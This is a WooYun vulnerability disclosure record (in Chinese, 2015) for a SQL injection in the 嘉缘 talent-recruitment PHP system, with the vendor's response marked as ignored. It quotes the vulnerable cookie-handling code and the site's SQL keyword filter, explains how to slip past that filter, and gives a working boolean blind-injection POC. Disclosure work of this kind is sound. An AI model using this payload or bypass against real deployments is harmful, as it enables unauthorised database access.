{"id": 40546, "wybug_id": "wooyun-2015-091369", "wybug_title": "嘉缘人才系统SQL注入漏洞", "wybug_corp": "finereason.com", "wybug_author": "路人甲", "wybug_date": "2015-01-15 10:27", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： RT 详细说明：  在common/comment.php中\nrequire(dirname(__FILE__).'/../config.inc.php');!isset($db)&&$db=connectdb();require_once(FR_ROOT.'/inc/paylog.inc.php');if(!$cfg['comment']=='1'){echo \"<script language=JavaScript>{alert('本站未开启评论功能！');window.close();}</script>\";exit;}$submit=isset($_POST['Submit'])?$_POST['Submit']:'';if($submit){\tif($cfg['comment']){\t\tif($anonymous){\t\t\t$c_username ='匿名网友';\t\t}else{\t\t\t$user_login=_getcookie('user_login');\t\t\tif($user_login){\t\t\t\t$pjrname=$user_login;\t\t\t}\t\t\t$c_username=$pjrname;\t\t\t$sql=\"select  m_id,m_pwd,m_typeid,m_groupid,m_name,m_loginip,m_logindate,m_email from {$cfg['tb_pre']}member where m_login='$pjrname'\";\t\t\t$rs= $db->get_one($sql);\n这里从cookie中获取了$user_login的值，然后带入到了后面的sql语句中执行，如果cookie没有进行过滤的话，那么就有可能产生注入，那先看下_getcookie的方法到底是什么:\nfunction _getcookie($var) {\tglobal $cfg;\t$var = $cfg['cookie_pre'].$var;\treturn isset($_COOKIE[$var]) ? $_COOKIE[$var] : '';}\n发现其只是从$_COOKIE中获取相应的数据，那些再看下有没有对$_COOKIE进行过滤:\nforeach(Array('_GET','_POST','_COOKIE') as $_request){\tforeach($$_request as $_k => $_v) $_k{0} != '_' && ${$_k} = is_array($_v)?_runmagicquotes($_v):cleartags(_runmagicquotes($_v));    //foreach($$_request as $_k => $_v) ${$_k} = _runmagicquotes($_v);}function _runmagicquotes(&$svar){\tif(!get_magic_quotes_gpc()){\t\tif( is_array($svar) ){\t\t\tforeach($svar as $_k => $_v) $svar[$_k] = _runmagicquotes($_v);\t\t}else{\t\t\t$svar = addslashes($svar);\t\t}\t}\treturn $svar;}\n从上面的方法中可以看到，其只是对转换后的变量就行的转义，但并没有对$_GET,$_POST,$_COOKIE本身的数据做转义，那刚才上面的sql注入就可以形成了。但是程序对整个sql语句做了防注入处理：\nfunction checksql($dbstr,$querytype='select'){\t$clean = '';\t$old_pos = 0;\t$pos = -1;\t//普通语句，直接过滤特殊语法\tif($querytype=='select'){\t\t$nastr = \"/[^0-9a-z@\\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\\.-]{1,}/i\";\t\tif(preg_match($nastr,$dbstr)){            log_write($dbstr,'sql');            showmsg('SafeError:10001', 'javascript:;');            exit();\t\t}\t}\t//完整的SQL检查\twhile (true){\t\t$pos = strpos($dbstr, '\\'', $pos + 1);\t\tif ($pos === false){\t\t\tbreak;\t\t}\t\t$clean .= substr($dbstr, $old_pos, $pos - $old_pos);\t\twhile (true){\t\t\t$pos1 = strpos($dbstr, '\\'', $pos + 1);\t\t\t$pos2 = strpos($dbstr, '\\\\', $pos + 1);\t\t\tif ($pos1 === false){\t\t\t\tbreak;\t\t\t}\t\t\telseif ($pos2 == false || $pos2 > $pos1){\t\t\t\t$pos = $pos1;\t\t\t\tbreak;\t\t\t}\t\t\t$pos = $pos2 + 1;\t\t}\t\t$clean .= '$s$';\t\t$old_pos = $pos + 1;\t}\t$clean .= substr($dbstr, $old_pos);\t$clean = trim(strtolower(preg_replace(array('~\\s+~s' ), array(' '), $clean)));\tif (strpos($clean, 'union') !== false && preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== false || strpos($clean, '#') !== false){\t\t$fail = true;\t}\telseif (strpos($clean, 'sleep') !== false && preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, 'benchmark') !== false && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, 'load_file') !== false && preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, 'into outfile') !== false && preg_match('~(^|[^a-z])into\\s+outfile($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (preg_match('~\\([^)]*?select~s', $clean) != 0){\t\t$fail = true;\t}\tif (!empty($fail)){        log_write($dbstr,'sql');        showmsg('SafeError:10002', 'javascript:;');exit;\t}\telse\t{\t\treturn $dbstr;\t}}\n首先是对整个sql语句做了过滤union 等特殊字符操作，这样就union，时间盲注等都没法使用了。程序又阻止了报错，报错法也不能使用。 那看下能否使用bool型盲注:回到漏洞点的地方，有一段这样的代码\nif($rs){\t\t\t\t$typeid=$rs[\"m_typeid\"];$name=$rs['m_name'];$loginip=$rs['m_loginip'];$logindate=$rs['m_logindate'];            \tif($rs['m_groupid']!=''){                \t$rsg=find_value_arr('g_id',$rs['m_groupid'],sysgroup($typeid));$Gintegral=explode(\",\",$rsg['g_integral']);                \tif($typeid==1){$integral=$Gintegral[6];$integral2=$Gintegral[9];}else{$integral=$Gintegral[5];$integral2=$Gintegral[7];}            \t}else{                \t$integral=$integral2=0;            \t}\t\t\t\tif($pjrpass){\t\t\t\t\tif($rs['m_pwd']==md5($pjrpass)){\t\t\t\t\t\t$pwd=md5($pjrpass);\t\t\t\t\t\t$db ->query(\"update {$cfg['tb_pre']}member set m_loginnum=m_loginnum+1,m_logindate=NOW(),m_loginip='$ip' where m_login='$pjrname'\");\t\t\t\t\t\t\t\t\t\t_setcookie('user_login',$pjrname,3600*24);\t\t\t\t\t\t_setcookie('user_pass',$pwd,3600*24);\t\t\t\t\t\t_setcookie('user_type',usertype($typeid),3600*24);\t\t\t\t\t\t_setcookie('user_name',$name,3600*24);\t\t\t\t\t\t_setcookie('user_loginip',$loginip,3600*24);\t\t\t\t\t\t_setcookie('user_logindate',$logindate,3600*24);\t\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\techo \"<script language=JavaScript>{alert('用户名密码错误，请重新输入！');window.close();}</script>\";exit;\t\t\t\t\t}\t\t\t\t}\t\t\t}\n如果查询到有数据时，会判断密码是否正确。我们可以控制结果是否存在，可以控制程序是否进入密码判断，这样就可以实现盲注了。但是还得绕过之前的sql语句检查。检查语句中第一步没有检查select 所以我们仍然可以用。  后面做了一个替换''之间内容的操作，利用这个操作 我们可以轻而易举的绕过比如:  where a=@`1` and (注入语句) #'   会被替换成 where a=@`'$XXX'    这样我们的注入语句就不会被后面的程序检查了，直接绕过了检测.最终的POC:' and m_login=@`'` or 1=1 and ord(mid(user(),1,1))=113 limit 0,1 #\n\n\n\n当把POC中的113改成114以后:\n\n   漏洞证明：  最终的POC:' and m_login=@`'` or 1=1 and ord(mid(user(),1,1))=113 limit 0,1 #\n\n\n\n当把POC中的113改成114以后:\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}